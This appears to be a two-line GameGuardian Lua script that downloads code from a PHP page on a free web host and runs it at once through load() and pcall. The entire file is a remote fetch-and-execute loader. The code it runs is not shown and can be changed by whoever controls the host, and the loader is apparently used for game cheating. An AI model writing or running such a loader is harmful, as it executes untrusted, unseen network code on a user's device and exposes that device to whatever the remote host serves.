

API = gg.makeRequest('https://quachty2501.000webhostapp.com/colamthimoicoan.php').content

pcall(load(API))
